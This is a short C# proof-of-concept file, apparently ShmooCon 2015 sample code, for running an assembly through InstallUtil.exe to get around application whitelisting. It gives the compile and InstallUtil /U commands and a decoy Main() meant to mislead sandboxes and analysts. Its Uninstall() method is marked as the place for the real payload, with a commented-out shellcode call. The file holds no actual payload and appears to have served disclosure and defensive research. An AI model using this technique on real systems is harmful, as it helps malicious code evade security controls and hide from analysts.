//ShmooCon 2015 - InstallUtil.exe Sample Code

using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
 
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Step One:

C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /out:exeshell.exe exeshell.cs

Step Two:

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
(Or)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe


	The gist of this one is we can exhibit one behaviour if the application is launched via normal method, Main().
	Yet, when the Assembly is launched via InstallUtil.exe, it is loaded via Reflection and circumvents many whitelist controls.
	We believe the root issue here is:
	
	The root issue here with Assembly.Load() is that at the point at which execute operations are detected 
	(CreateFileMapping->NtCreateSection), only read-only access to the section is requested, so it is not processed as an execute operation.  
	Later, execute access is requested in the file mapping (MapViewOfFile->NtMapViewOfSection), 
	which results in the image being mapped as EXECUTE_WRITECOPY and subsequently allows unchecked execute access.
	
	The concern is this technique can circumvent many security products, so I wanted to make you aware and get any feedback.
	Its not really an exploit, but just a creative way to launch an exe/assembly.
*/
 
namespace Exec
{
	public class Program
	{
		public static void Main()
		{
			Console.WriteLine("Hello From Main...I Don't Do Anything");
			//Add any behaviour here to throw off sandbox execution/analysts :)
			
		}
		
	}
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
	    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	    public override void Uninstall(System.Collections.IDictionary savedState)
	    {
		Console.WriteLine("Hello From Uninstall...I carry out the real work...");
	    	//ShellCode.DoEvil();
	    	
	    }
	    
	}
}
